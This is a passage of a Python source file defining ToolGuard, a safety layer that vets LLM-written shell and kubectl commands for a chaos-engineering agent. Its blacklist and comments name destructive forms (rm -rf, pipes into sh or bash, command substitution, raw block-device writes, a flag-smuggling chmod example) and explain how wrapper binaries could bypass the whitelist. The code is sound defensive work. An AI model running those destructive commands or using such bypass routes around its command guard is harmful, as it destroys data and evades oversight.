"""Tool Guard: command execution safety.

Enforces a whitelist of allowed commands, kubectl subcommand
restrictions, and a parameter blacklist to prevent dangerous operations.

E11 — host_part regex was replaced by AST-level parsing via
``guard_parser.parse_command``. Behaviour:
  1. Binary whitelist (unchanged).
  2. kubectl/blade subcommand whitelist (subcommand extracted by parser
     instead of an inline while-loop).
  2b. Per-binary argument guards, narrowing an ADMITTED binary/subcommand
     down to its safe forms: ``systemctl`` verb whitelist, ``kill`` PID
     target, ``chmod`` recursion, ``kubectl drain`` unrecoverable flags,
     ``kubectl config`` read-only, ``systemd-run`` timer-only form. Each
     ``_check_*`` returns a full ``GuardFeedback`` (or ``None`` to pass) so it
     owns every field of its own verdict instead of the caller flattening it
     into a string.
  3. Token-level checks on ``ParsedCommand.host_relevant_tokens()``
     only — no more ``" ".join(cmd)`` cross-token false positives.
     Two checks per host token:
       a. Solo shell-metachar (``SUSPICIOUS_SOLO_TOKENS``) — ``|``
          ``;`` ``&`` ``>`` ``<`` etc.
       b. Regex blacklist (``PARAM_BLACKLIST_PATTERNS``).
     Data payload flag values (``-p`` ``--patch`` ``--from-literal``
     ``-l`` ``--field-selector`` …) and container_command (after
     ``--`` for ``kubectl exec/run/debug``) are excluded from
     BOTH checks — they are not shell tokens on the host (subprocess
     uses ``shell=False``), so a stray ``|`` in those positions is at
     worst a no-op, never a host-injection.

Every rejection is a :class:`~chaos_agent.tools.guard_feedback.GuardFeedback`
and follows that module's contract, which is a behavioural requirement here,
not documentation polish:

  - ``reason`` names the SPECIFIC rule that fired — never an OR-list the model
    has to guess from, and never a generic label;
  - ``offending`` echoes the exact token, so a machine reader has a field to
    key on rather than parsing English;
  - ``compliant_form`` carries the way forward. Anything the model can fix by
    editing the command (drop a flag, name another PID) MUST land here and MUST
    NOT be flagged ``is_hard_floor`` — a false dead-end makes the model abandon
    a viable path. A genuine floor may still point at a DIFFERENT route (the
    binary whitelist points at ``host_read``) but must never imply that
    reshaping the same command would pass;
  - a whitelist the guard OWNS is stated in the rejection. Withholding it
    (task-c758cdbd) sent the model to a tool docstring that was itself stale,
    turning one correction into a guessing loop.

``tests/test_tools/test_guard.py`` asserts these across every rejection path.
"""

import json
import logging
import re
import shlex
from dataclasses import asdict
from pathlib import Path

from chaos_agent.bashfacts.facts import CommandFacts, ScriptFacts
from chaos_agent.bashfacts.parser import parse_script
from chaos_agent.models.command_result import CommandResult
from chaos_agent.tools.guard_feedback import (
    EvidenceSpan,
    GuardFeedback,
    ViolatedConstraint,
)
from chaos_agent.tools.guard_parser import (
    SUSPICIOUS_SOLO_TOKENS,
    parse_command,
)
from chaos_agent.tools.readonly import _READONLY_BINARIES
from chaos_agent.utils.time import now_iso

logger = logging.getLogger(__name__)


# Device-node families whose direct write = disk destruction. Covers raw disks
# (sd/nvme/vd/hd/xvd), LVM & device-mapper (dm-/mapper/), software RAID (md),
# eMMC (mmcblk), loopback (loop), optical (sr), mainframe DASD (dasd), network
# block devices (nbd) and Ceph RBD (rbd).
# NOTE: modern servers usually root on LVM (/dev/mapper/...), so omitting these
# families would leave the most common layout unprotected.
_BLOCK_DEVICE_FAMILIES = (
    r"sd|nvme|vd|hd|xvd|disk|dm-|md|mmcblk|loop|dasd|sr|nbd|rbd|mapper/"
)


# Read-only text filters an LLM commonly pipes a query into
# (``kubectl get ... | wc -l``). Used ONLY to choose an actionable error
# message — the pipe is still blocked regardless (exec-form, shell=False), so
# this list never widens what can execute; it only decides whether the guard
# returns a helpful "use native kubectl" hint or the generic dangerous verdict.
_BENIGN_PIPE_FILTERS = frozenset(
    {"wc", "head", "tail", "sort", "uniq", "grep", "cut", "nl", "column", "tr"}
)


def _classify_blacklist_pattern(pattern_src: str) -> tuple[str, bool]:
    """Map a blacklisted parameter pattern to (human category, is_hard_floor).

    Turns the anonymous "Dangerous pattern detected" verdict — which used to
    cover 9+ unrelated causes with one identical string — into a specific,
    differentiated cause so the model knows WHAT it hit and whether the path is
    a hard floor (never permitted) or a reshapeable limit. Matches on the
    pattern SOURCE with tolerant substring checks, so a custom blacklist still
    degrades to a safe hard-floor default rather than mislabelling.
    """
    p = pattern_src
    if "rm" in p and "-rf" in p:
        return "irreversible bulk deletion (rm -rf)", True
    if "/dev/" in p and ("of=" in p or "filename=" in p):
        return "raw block-device write (disk destruction)", True
    if ">" in p and "/dev/" in p:
        return "redirect to a device node", True
    if ";" in p and "rm" in p:
        return "chained shell deletion", True
    if "bash" in p or ("sh" in p and "|" in p):
        return "pipe into a shell interpreter (arbitrary code)", True
    if "`" in p:
        return "command substitution via backticks", True
    if "$" in p and "(" in p:
        return "command substitution via $(...)", True
    if "count=" in p:
        return "dd count exceeds magnitude cap (DoS guard)", False
    if "runtime=" in p:
        return "fio runtime exceeds magnitude cap (DoS guard)", False
    return "forbidden parameter", True


def _token_span(cmd: list[str], token: str, label: str) -> tuple[EvidenceSpan, ...]:
    """Best-effort locate of ``token`` inside the exec-form display string.

    The span indexes ``" ".join(cmd)`` — the same text audit / SSE / TUI
    surfaces render — so a highlight layer maps it directly onto what the
    user sees. Tokens are matched on whole argv elements, never by a bare
    substring search: ``find`` would point INSIDE a sibling argument (the
    ``|`` inside ``a|b``) and highlight the wrong characters. One exception:
    the parser splits ``--runtime=9999999`` into ``--runtime`` plus the
    value, so a value token owns no argv element of its own — it is pinned
    to its slot inside the joined parent element. Empty when the token is
    empty or absent; a standalone element always beats an embedded
    occurrence (evidence guides the eye, it never decides).
    """
    if not token:
        return ()
    offset = 0
    for part in cmd:
        if part == token:
            return (EvidenceSpan(start=offset, end=offset + len(token), label=label),)
        offset += len(part) + 1
    # Parser-split flag values (right of the ``=`` in a ``--flag=value``
    # element) own no argv element; pin such a token to its exact slot
    # inside the joined parent — never to an unrelated substring.
    offset = 0
    for part in cmd:
        if part.startswith("-") and "=" in part:
            value = part.split("=", 1)[1]
            if value == token:
                start = offset + len(part) - len(token)
                return (EvidenceSpan(start=start, end=offset + len(part), label=label),)
        offset += len(part) + 1
    return ()


def _is_command_substitution_pattern(pattern_src: str) -> bool:
    """True for the two blacklist patterns that flag command substitution.

    Same source-substring discipline as ``_classify_blacklist_pattern`` —
    note the regex escaping: the ``$(...)`` pattern's SOURCE is ``\\$(``, so
    a literal ``"$("`` substring check never fires; mirror the classifier's
    ``"$" in p and "(" in p`` form exactly.
    """
    return "`" in pattern_src or ("$" in pattern_src and "(" in pattern_src)


def _blacklist_evidence_label(pattern_src: str) -> str:
    r"""Machine label for a blacklisted-pattern evidence span.

    Same source-substring discipline as ``_classify_blacklist_pattern`` —
    note the regex escaping: the ``$(...)`` pattern's SOURCE is ``\$(``, so
    a literal ``"$("`` substring check never fires; mirror the classifier's
    ``"$" in p and "(" in p`` form exactly.
    """
    if _is_command_substitution_pattern(pattern_src):
        return "command_substitution"
    return "blacklist_pattern"


# ``systemd-run`` flags that take their value as a SEPARATE argv token
# (``--flag value``); ``--flag=value`` forms carry it inline and need no
# entry. Used only to locate where the positional COMMAND (the timer
# payload) starts — the flags themselves stay fully checked by Gate ②.
_SYSTEMD_RUN_VALUE_FLAGS = frozenset(
    {
        "--on-active",
        "--on-boot",
        "--on-startup",
        "--on-unit-active",
        "--on-unit-idle",
        "--on-calendar",
        "--unit",
        "--description",
        "--working-directory",
        "--same-dir",
        "--setenv",
        "--property",
        "-p",
        "--timer-property",
        "--uid",
        "--gid",
        "--nice",
        "--oom-score-adjust",
        "--cpu-affinity",
        "--slice",
        "--service-type",
    }
)


def _systemd_run_payload_start(cmd: list[str]) -> int:
    """Index of the first positional token — where the timer payload starts.

    Mirrors systemd-run's own argv parsing: options may precede the COMMAND;
    from the first positional token on, everything (``--``-prefixed or not)
    is argv FOR that command and is never re-parsed as a systemd-run option.
    Value flags in ``--flag value`` form swallow their separate value token.
    """
    i = 1
    while i < len(cmd):
        arg = cmd[i]
        if arg.startswith("-") and arg != "-":
            if "=" not in arg and arg in _SYSTEMD_RUN_VALUE_FLAGS:
                i += 1  # skip the flag's separate value token
        else:
            return i
        i += 1
    return len(cmd)


def is_systemd_run_timer(cmd: list[str]) -> bool:
    """True when a ``systemd-run`` argv is in its self-recovery TIMER form.

    SINGLE SOURCE for two consumers that must never drift:

    - ToolGuard admission (:meth:`_check_systemd_run`): ``systemd-run`` is
      admitted ONLY in this form — an ``--on-active`` delay before the
      first positional makes the payload run at the DEADLINE, so a native
      fault self-reverses even if the session dies; without it the payload
      runs IMMEDIATELY (arbitrary execution wearing a whitelisted name).
    - machinery≠mutation attribution (R23/G-7, execution_artifacts' HOST
      face): a call in this admitted form is a timer REGISTRATION, never
      an injection — the payload executes at the deadline, not at issue
      time, so the issue-time attributor must not count it. Because the
      guard rejects every other systemd-run shape BEFORE the tool runs,
      this form verdict is also the machinery verdict by construction.

    The ``--on-active`` must sit in the OPTION region (before the payload
    start) — a payload-carried flag (``systemd-run nginx --on-active=600s``
    hands the flag to NGINX, arming nothing) is NOT a timer.
    """
    if not cmd or cmd[0] != "systemd-run":
        return False
    payload_start = _systemd_run_payload_start(cmd)
    return any(
        arg == "--on-active" or arg.startswith("--on-active=")
        for arg in cmd[1:payload_start]
    )


def _systemd_run_payload_tokens(cmd: list[str]) -> frozenset[str]:
    """The timer-payload tokens of a ``systemd-run`` argv.

    ``systemd-run [flags] COMMAND [ARGS...]``: from the first positional
    token on, everything IS the command the timer will execute at the
    deadline — including a quoted ``sh -c '…$(…)…'`` script that only the
    TARGET's shell will ever expand.
    """
    return frozenset(cmd[_systemd_run_payload_start(cmd) :])


def _wiz_command_values(cmd: list[str]) -> list[str]:
    """The ``--command`` values of a ``wiz`` argv (both flag spellings).

    ``wiz task exec --command <value>`` / ``--command=<value>``: the value
    is the command region the remote side will run — wiz's only payload
    carrier (the transport channel assembles the same flag when IT builds a
    wiz call, but channel-assembled calls never pass the guard; only an
    LLM-authored argv starting with ``wiz`` reaches this checker).
    """
    values: list[str] = []
    i = 1
    while i < len(cmd):
        arg = cmd[i]
        if arg == "--command":
            if i + 1 < len(cmd):
                values.append(cmd[i + 1])
            i += 2
            continue
        if arg.startswith("--command="):
            values.append(arg.split("=", 1)[1])
        i += 1
    return values


# ── payload-region readmission ──────────────────────────────────────
# A carrier's command region rides INSIDE a whitelisted binary's argv, so
# Gate ① (binary whitelist) and Gate ③ (per-binary checkers) — both keyed on
# ``cmd[0]`` alone — never see it. The readmission layer below puts the
# region through the SAME admission a directly-executed command meets.

# Interpreter form: the region is a script the TARGET's shell will parse,
# legal only as ``sh -c '<script>'`` (a bare ``sh <file>`` runs a script the
# guard cannot see, and a 4th token is a $0 form no skill teaches).
_PAYLOAD_INTERPRETERS = frozenset({"sh", "bash"})
# Nested carriers inside a payload script: multi-layer carriage has no
# skill precedent and only ever lengthens the guard's decision chain.
_NESTED_CARRIERS = frozenset({"systemd-run", "wiz"})
# Redirect targets a payload script may write to: discard sinks only. The
# one redirect the skills teach is ``2>/dev/null``; writing a payload's
# output to a real file is no recovery step any skill prescribes.
_PAYLOAD_REDIRECT_SINKS = ("/dev/null", "/dev/stdout", "/dev/stderr", "/dev/fd/")
# Heads allowed INSIDE a ``$(...)`` body of a payload script. The skills'
# one use of substitution in payloads is resolving PIDs (``kill -CONT
# $(pidof x)``); anything wider would let a probe's OUTPUT smuggle flags —
# ``chmod $(echo -R) 777 /etc`` is a recursive chmod the static replay
# cannot see. Fail closed to the PID probes.
_PAYLOAD_SUBST_PROBES = frozenset({"pidof", "pgrep"})


class ToolGuard:
    """Security guard for tool command execution."""

    # Guard-owned base binaries: read-only diagnostics / transport primitives
    # that belong to no single fault backend. Every other admitted binary is
    # contributed by a provider's ``injection_binaries`` (see
    # ``_default_allowed_commands``) — this keeps "which binary a backend runs"
    # as knowledge owned by that backend.
    BASE_COMMANDS = {
        # Diagnostics / transport
        "df",
        "ping",
        "sleep",
    }

    # Authoritative reference / equivalence anchor: the COMPLETE default binary
    # whitelist expected after aggregation (BASE_COMMANDS ∪ every built-in
    # provider's ``injection_binaries``). The runtime default is assembled
    # declaratively in ``_default_allowed_commands``; this static set is retained
    # as documentation and as the anchor the "aggregation equivalence" test
    # asserts against, guaranteeing the knowledge-ownership refactor introduced
    # ZERO change to the effective whitelist.
    ALLOWED_COMMANDS = {
        # K8s (chaosblade: blade; k8s_native: kubectl / wiz)
        "blade",
        "kubectl",
        "wiz",
        # Host fault injection (host_shell)
        "iptables",
        "ip6tables",
        "nft",
        "tc",
        "stress",
        "stress-ng",
        "dd",
        "fallocate",
        "fio",
        # Diagnostics (guard base)
        "df",
        "ping",
        "sleep",
        # Host recovery / low-risk fault primitives (Tier 1, host_shell): bounded
        # blast radius, reversible or self-limiting, single-command form.
        "truncate",
        "chmod",
        "cp",
        "kill",
        "ntpdate",
        "chronyc",
        # Host service / time control (Tier 2, host_shell): admitted only WITH
        # the extra per-binary guards below (systemctl verb whitelist, kill PID /
        # chmod recursion checks). Never admit interpreters or shell (sh/bash/
        # python).
        "systemctl",
        "date",
        "timedatectl",
        "mv",
        # Self-recovery timer carrier (Tier 2, host_shell): admitted only in
        # its timer form (`--on-active=<N>s`) by ``_check_systemd_run`` below —
        # the skill 降级方案 pattern "先武装定时恢复，再注入". A bare
        # ``systemd-run <cmd>`` would be a synchronous arbitrary-execution
        # bypass of this whitelist.
        "systemd-run",
        # Single-resource fault primitives (Tier 2, host_shell): each is the only
        # single-command way to express its fault, and each is narrowed to that
        # form by its own guard (_check_nc listen-only, _check_fuser
        # port-spec-only, _check_strace attach-only).
        "nc",
        "fuser",
        "strace",
        # Drill-artifact cleanup tail (Tier 2, host_shell): the host twin of
        # ``kubectl delete <debug-pod>`` — every skill ends a manual recovery
        # with ``rm -f <file>.bak``, deleting a file the DRILL itself created
        # (backup / fill file). Narrowed to that exact form by ``_check_rm``:
        # recursive forms have no drill boundary and are never admitted.
        "rm",
    }

    # kubectl subcommands the tool layer will RUN (Gate ②). This is the
    # execution gate, deliberately narrower than
    # ``classifier.DESTRUCTIVE_KUBECTL_SUBS`` (a safety-classification set that
    # also recognises verbs we refuse to run, e.g. edit/run/proxy).
    # ``replace`` IS admitted: the PVC / limits / topology cases teach it as
    # the ONLY working restore verb (apply's three-way merge keeps fields the
    # injection added, so the restore is incomplete; replace PUTs the whole
    # object and restores exactly) — refusing it makes the skill's restore
    # step unexecutable-by-construction, the exact failure mode the
    # invariant below exists to prevent. It stays inside the destructive
    # classification set, so admitting it hides nothing from the guard.
    #
    # Invariant (test_kubectl_verb_consistency): it must be a SUPERSET of
    # ``K8sNativeProvider.inject_kubectl_subcommands`` and
    # ``step_kubectl_verbs``. A verb the provider declares as an injection
    # carrier — or that the multi-step self-check expects to see performed —
    # while this gate refuses it is unexecutable-by-construction: the drill step
    # can never be satisfied, and the self-check keeps asking the model to redo
    # an action the guard will reject again.
    KUBECTL_ALLOWED_SUBCOMMANDS = {
        "get",
        "describe",
        "delete",
        "replace",
        "exec",
        "logs",
        "top",
        "patch",
        "set",
        "scale",
        "debug",
        "wait",
        "cordon",
        "uncordon",
        "taint",
        # Metadata writes. Strict subsets of ``patch`` (which already admits
        # ``-p '{"metadata":{"labels":...}}'``), so admitting them widens
        # nothing — it only spares the model a rejected call plus a rewrite
        # into the patch form.
        "label",
        "annotate",
        # Node maintenance. Admitted WITH the per-binary guard below
        # (``_check_kubectl_drain``) — see that method for which flags exceed a
        # drill's blast radius.
        "drain",
        "apply",
        "create",
        "rollout",
        "version",
        "cluster-info",
        "api-resources",
        "explain",
        "auth",
        "config",
        # Pod creation via ``kubectl run``. Admitted for the recovery-carrier
        # standard (openspec recovery-carrier-standard): the recovery timer
        # host pod for API-plane faults. The verb is whitelisted HERE, but
        # the SHAPE is narrowed by the per-subcommand guard below
        # (``_check_kubectl_run``) — an unrestricted ``run`` is an arbitrary
        # pod spawner the identity review cannot see: a CREATED pod's name
        # can never match the approved identity, and the secondary net's
        # pod entry is namespace-anchored, so an in-net non-carrier run
        # would pass the drift gate by construction.
        "run",
    }

    # ``kubectl drain`` flags that exceed a drill's blast radius, each mapped to
    # the SPECIFIC reason it is refused — the ``GuardFeedback`` contract asks for
    # the cause that actually fired, not an OR-list the model has to guess from.
    #
    # Evicting pods is the point of a node-maintenance drill and IS recoverable:
    # eviction goes through the eviction API (so PodDisruptionBudgets hold) and
    # the owning controllers reschedule everything once the node is
    # ``uncordon``ed. These two break exactly that property.
    #
    # ``--delete-emptydir-data`` is deliberately NOT here, though an early
    # version of this guard banned it. An emptyDir lives and dies WITH its pod
    # by definition, so losing it is the inherent semantics of deleting a pod,
    # not extra destruction — and ``kubectl delete pod`` (long whitelisted)
    # discards exactly the same data with no flag at all. Banning it protects
    # nothing while making drain unusable on any real cluster, where enough pods
    # mount an emptyDir that drain refuses to evict without it. The
    # ``Node_维护_节点排空Drain`` skill case relies on it.
    KUBECTL_DRAIN_FORBIDDEN_FLAGS = {
        "--force": (
            "it deletes pods that have NO owning controller, so nothing "
            "recreates them — 'kubectl uncordon' cannot bring them back and the "
            "pod itself is gone, not just its data. It is also a batch implicit "
            "delete: the target guard only sees node scope and cannot know which "
            "pods vanish"
        ),
        "--disable-eviction": (
            "it deletes pods around the eviction API, overriding "
            "PodDisruptionBudgets — the very availability guarantee the drill "
            "exists to exercise"
        ),
    }
    # Deterministic alternative for both cases: the flag is never required.
    _KUBECTL_DRAIN_COMPLIANT_FORM = (
        "Drop the flag and drain again. If it then fails on an unmanaged pod, "
        "NOTHING was evicted (drain is atomic there) — treat that node as an "
        "invalid drain target instead of forcing it."
    )

    # systemctl verbs permitted for service-level chaos + recovery. Machine /
    # boot-level verbs (poweroff / reboot / halt / kexec / isolate / disable /
    # enable / daemon-reload / suspend / hibernate) are intentionally excluded —
    # they exceed the blast radius of a single-service drill. reset-failed only
    # clears a unit's in-memory failed marker (transient-timer re-arm hygiene
    # after a failed payload; no start/stop side effect), so it stays inside
    # that blast radius.
    SYSTEMCTL_ALLOWED_SUBCOMMANDS = {
        "start",
        "stop",
        "restart",
        "mask",
        "unmask",
        "status",
        "is-active",
        "is-enabled",
        "reset-failed",
    }

    PARAM_BLACKLIST_PATTERNS = [
        r"rm\s+-rf",
        # Redirects into block devices destroy data; redirects into the
        # pseudo-devices null/stdout/stderr/fd are harmless discard sinks
        # (``2>/dev/null``). A bare ``>`` token stays caught by
        # SUSPICIOUS_SOLO_TOKENS — exec-form cannot redirect at all — so
        # this exemption only stops mislabelling glued tokens as a
        # device-write hard floor (task-4208d61c read-only probe).
        r">\s*/dev/(?!(?:null|stdout|stderr|fd)(?:\b|/))",
        r";\s*rm",
        r"\|\s*bash",
        r"\|\s*sh",
        r"`.*`",
        r"\$\(",
        # Block writes to raw block devices (disk destruction prevention).
        # Covers LVM/device-mapper/RAID/eMMC, not just bare disks — see
        # _BLOCK_DEVICE_FAMILIES.  The ``> /dev/`` redirect form is caught
        # separately by the ``>\s*/dev/`` pattern above.
        rf"of=/dev/({_BLOCK_DEVICE_FAMILIES})",
        rf"--filename=/dev/({_BLOCK_DEVICE_FAMILIES})",
        # Block unreasonably large resource values (DoS prevention).
        # These match =-syntax tokens (e.g. ``count=9999999``) where the
        # flag and value are a single argv element.  NOTE: this is a
        # best-effort magnitude cap for dd(count)/fio(runtime) only; other
        # tools (stress-ng --timeout, fallocate -l, dd bs=) rely on the
        # upstream ``--timeout`` auto-recovery as the primary bound.
        r"count=[0-9]{7,}",
        r"--runtime=[0-9]{7,}",
    ]

    def __init__(
        self,
        allowed_commands: set[str] | None = None,
        kubectl_subcommands: set[str] | None = None,
        systemctl_subcommands: set[str] | None = None,
        param_blacklist: list[str] | None = None,
    ):
        self.allowed_commands = allowed_commands or self._default_allowed_commands()
        self.kubectl_subcommands = (
            kubectl_subcommands or self.KUBECTL_ALLOWED_SUBCOMMANDS
        )
        self.systemctl_subcommands = (
            systemctl_subcommands or self.SYSTEMCTL_ALLOWED_SUBCOMMANDS
        )
        self.param_blacklist = param_blacklist or self.PARAM_BLACKLIST_PATTERNS
        self._compiled_patterns = [re.compile(p) for p in self.param_blacklist]
        # Single dispatch table for Gate ③b: evaluate() looks the EXECUTED
        # binary up here, and the payload-region readmission replays the
        # SAME checkers on a payload's head — one table, so the two can
        # never drift apart.
        self._binary_checkers = {
            "systemctl": self._check_systemctl,
            "kill": self._check_kill,
            "chmod": self._check_chmod,
            "nc": self._check_nc,
            "fuser": self._check_fuser,
            "strace": self._check_strace,
            "systemd-run": self._check_systemd_run,
            "rm": self._check_rm,
            "wiz": self._check_wiz,
        }

    @classmethod
    def _default_allowed_commands(cls) -> set[str]:
        """Assemble the default Gate-① binary whitelist declaratively.

        Result = :attr:`BASE_COMMANDS` (guard-owned diagnostics / transport)
        UNION every registered provider's ``injection_binaries`` (each backend
        owns "which binaries it runs"). In normal operation this equals the
        static :attr:`ALLOWED_COMMANDS` reference — asserted by the aggregation
        equivalence test.

        SECURITY (hard boundary): a plain set UNION — no wildcard, no
        auto-discovery. A binary is admitted ONLY if it is in ``BASE_COMMANDS``
        or a provider EXPLICITLY lists it in ``injection_binaries`` (equivalent
        to manual review). Interpreters / shells and the guardrails themselves
        are in NO provider's ``injection_binaries``, so they can never leak in.
        Gate ② (solo-token / param blacklist / per-binary guards) is unaffected.

        Degradation: if the provider registry is empty (e.g. a test called
        ``FaultProviderRegistry.clear()``), the union collapses to
        ``BASE_COMMANDS`` — the guard fails CLOSED to the minimal diagnostic
        set, never open. Importing the registry triggers the providers package's
        self-registration, so the built-ins are normally present.
        """
        # Lazy import: keep tools.guard importable without eagerly pulling the
        # agent.providers package (matches the codebase's deferred-import style
        # and avoids any import-time coupling to provider registration order).
        from chaos_agent.agent.providers.registry import FaultProviderRegistry

        commands = set(cls.BASE_COMMANDS)
        for provider in FaultProviderRegistry.all_providers():
            commands |= set(getattr(provider, "injection_binaries", frozenset()))
        return commands

    def check(self, cmd: list[str]) -> tuple[bool, str]:
        """Check if a command is allowed to execute.

        Returns (is_allowed, reason). Thin backward-compatible adapter over
        :meth:`evaluate` (which carries the full differentiated feedback).
        """
        return self.evaluate(cmd).as_tuple()

    def evaluate(self, cmd: list[str]) -> GuardFeedback:
        """Full command-safety verdict as a :class:`GuardFeedback`.

        Same policy as before — this NEVER widens what may execute. The only
        change is that every rejection now names the SPECIFIC rule that fired,
        echoes the offending token, and flags whether it is a hard floor (never
        permitted) or a reshapeable form issue — so the model perceives what
        actually happened and can self-correct, instead of guessing against an
        opaque catch-all verdict.
        """
        if not cmd:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="Empty command",
            )

        binary = Path(cmd[0]).name

        # 1. Command whitelist
        if binary not in self.allowed_commands:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNKNOWN_BINARY,
                reason=f"Command not allowed: {binary}",
                offending=binary,
                is_hard_floor=True,
                # The guard KNOWS the allow-list; withholding it forces the
                # model to guess from a tool docstring that may be stale. Cheap
                # to state, and it is the only authoritative source.
                compliant_form=(
                    "Runnable binaries: "
                    + ", ".join(sorted(self.allowed_commands))
                    + ". Read-only host diagnostics (df/ps/ss/cat/...) are NOT "
                    "here on purpose — reach them through the host_read tool, "
                    "not this binary whitelist."
                ),
            )

        # 2. AST-level parse — single source of structure for the rest
        # of the checks (subcommand identification + payload/container
        # exclusion). Pure function, never raises.
        parsed = parse_command(cmd)

        # 3. kubectl subcommand whitelist (from parsed.subcommand)
        if binary == "kubectl" and parsed.subcommand:
            if parsed.subcommand not in self.kubectl_subcommands:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"kubectl subcommand not allowed: {parsed.subcommand}",
                    offending=parsed.subcommand,
                    # task-c758cdbd: the model met the bare "not allowed: label"
                    # verdict, went to the kubectl tool docstring to work out
                    # what WAS allowed, and read a list that was itself wrong.
                    # This gate holds the authoritative set — say it.
                    compliant_form=(
                        "Allowed subcommands: "
                        + ", ".join(sorted(self.kubectl_subcommands))
                        + "."
                    ),
                )
            if parsed.subcommand == "config":
                config_index = cmd.index("config")
                config_action = (
                    cmd[config_index + 1] if config_index + 1 < len(cmd) else ""
                )
                if config_action != "view":
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason="kubectl config only allows read-only 'view'",
                        offending=config_action,
                        compliant_form=(
                            "Use 'kubectl config view' to inspect. Writes to "
                            "the kubeconfig (use-context/set-context/"
                            "set-cluster/...) change which cluster EVERY "
                            "subsequent call targets, which is outside the "
                            "target-scoped operation model — pass "
                            "--context/--kubeconfig on the individual call "
                            "instead."
                        ),
                    )
            if parsed.subcommand == "drain":
                drain_feedback = self._check_kubectl_drain(cmd)
                if drain_feedback is not None:
                    return drain_feedback
            if parsed.subcommand == "run":
                run_feedback = self._check_kubectl_run(cmd)
                if run_feedback is not None:
                    return run_feedback
            if parsed.subcommand == "create":
                create_feedback = self._check_kubectl_create(cmd)
                if create_feedback is not None:
                    return create_feedback
            kustomize_feedback = self._check_kubectl_kustomize(
                cmd, parsed.subcommand
            )
            if kustomize_feedback is not None:
                return kustomize_feedback
            manifest_widening_feedback = (
                self._check_kubectl_manifest_widening(cmd, parsed.subcommand)
            )
            if manifest_widening_feedback is not None:
                return manifest_widening_feedback

        # 3b. Per-binary host guards for the Tier-2 / signal binaries. These
        # narrow an admitted binary down to its safe, single-target forms. Each
        # returns a full GuardFeedback so the offending token and the compliant
        # form land in their own fields rather than being concatenated into one
        # opaque sentence.
        checker = self._binary_checkers.get(binary)
        if checker is not None:
            feedback = checker(cmd)
            if feedback is not None:
                return feedback

        # 3c. Carrier-payload exemption for the Gate ② command-substitution
        # patterns ONLY. The payload region has ALREADY been re-admitted
        # structurally by the carrier's own checker (Gate ③b above): every
        # ``$()`` body inside it was parsed by bashfacts and its segment
        # heads checked against the whitelist, so a quoted
        # ``sh -c 'kill -CONT $(pgrep -f x)'`` payload is a TARGET-shell
        # expansion the guard has already vetted — ``$(`` there is not a
        # host injection. Every OTHER blacklist pattern (``rm -rf``,
        # raw-device writes, magnitude caps) still fires on the payload —
        # it genuinely executes eventually.
        carrier_payload_tokens: frozenset[str] = frozenset()
        carrier_option_tokens: frozenset[str] = frozenset()
        if binary == "systemd-run":
            carrier_payload_tokens = _systemd_run_payload_tokens(cmd)
            carrier_option_tokens = frozenset(cmd[1 : _systemd_run_payload_start(cmd)])
        elif binary == "wiz":
            carrier_payload_tokens = frozenset(_wiz_command_values(cmd))
            carrier_option_tokens = frozenset(
                t for t in cmd[1:] if t not in carrier_payload_tokens
            )

        # 4 + 5. Token-level checks (SUSPICIOUS_SOLO_TOKENS + regex blacklist)
        # on host-relevant tokens only. Excludes data_payload_values and
        # container_command (tokens after ``--`` for exec/run/debug) —
        # under shell=False a stray metachar there is a literal argv, never a
        # host-side pipeline, so it is not a security issue.
        host_tokens = parsed.host_relevant_tokens()
        for i, token in enumerate(host_tokens):
            if token in SUSPICIOUS_SOLO_TOKENS:
                # Benign case: piping ANY read-only command's output into a
                # text filter. Still BLOCKED (exec-form never runs the pipe),
                # but the model is told to post-process the returned output
                # itself rather than retry another pipe.
                if (
                    token == "|"
                    and i + 1 < len(host_tokens)
                    and host_tokens[i + 1] in _BENIGN_PIPE_FILTERS
                ):
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason=(
                            "Shell pipe '|' is not supported (exec-form, shell=False)."
                        ),
                        offending=token,
                        evidence=_token_span(cmd, token, "shell_metacharacter"),
                        compliant_form=(
                            "The command's raw output is returned to you in "
                            "full — perform any post-processing (counting, "
                            "filtering, sorting, selecting, truncating) "
                            "yourself by reasoning over that output, rather "
                            "than piping it into another command."
                        ),
                    )
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=(
                        f"Dangerous pattern: shell metacharacter {token!r} is "
                        "not supported in exec-form (shell=False), so it cannot "
                        "pipe, redirect, chain, or background."
                    ),
                    offending=token,
                    evidence=_token_span(cmd, token, "shell_metacharacter"),
                    compliant_form=(
                        "Express the intent as a single standalone command."
                    ),
                )
            for pattern in self._compiled_patterns:
                if (
                    carrier_payload_tokens
                    and token in carrier_payload_tokens
                    and token not in carrier_option_tokens
                    and _is_command_substitution_pattern(pattern.pattern)
                ):
                    continue
                if pattern.search(token):
                    category, hard = _classify_blacklist_pattern(pattern.pattern)
                    return GuardFeedback(
                        allowed=False,
                        constraint=(
                            ViolatedConstraint.DESTRUCTIVE_FLOOR
                            if hard
                            else ViolatedConstraint.UNSUPPORTED_FORM
                        ),
                        reason=(
                            f"Dangerous pattern [{category}]: token {token!r} "
                            + (
                                "is a hard safety floor and is never permitted."
                                if hard
                                else "exceeds a safety limit."
                            )
                        ),
                        offending=token,
                        evidence=_token_span(
                            cmd,
                            token,
                            _blacklist_evidence_label(pattern.pattern),
                        ),
                        is_hard_floor=hard,
                        # A magnitude cap is reshapeable, a destructive floor is
                        # not — only offer a way forward for the former, rather
                        # than implying a dead-end has one.
                        compliant_form=(
                            ""
                            if hard
                            else "Reshape it within the allowed bound and retry."
                        ),
                    )

        return GuardFeedback(allowed=True)

    def _check_kubectl_drain(self, cmd: list[str]) -> GuardFeedback | None:
        """Narrow ``kubectl drain`` to its recoverable form.

        Draining a node is a legitimate maintenance drill: pods are evicted
        through the eviction API (so PodDisruptionBudgets still apply) and the
        owning controllers reschedule them once the node is ``uncordon``ed.
        :attr:`KUBECTL_DRAIN_FORBIDDEN_FLAGS` maps each flag that breaks that
        recoverability to its own cause.

        Returns the rejection feedback, or ``None`` when the call is fine.
        Like every per-binary check it returns a full :class:`GuardFeedback`
        so the per-flag cause goes in ``reason`` and the alternative in
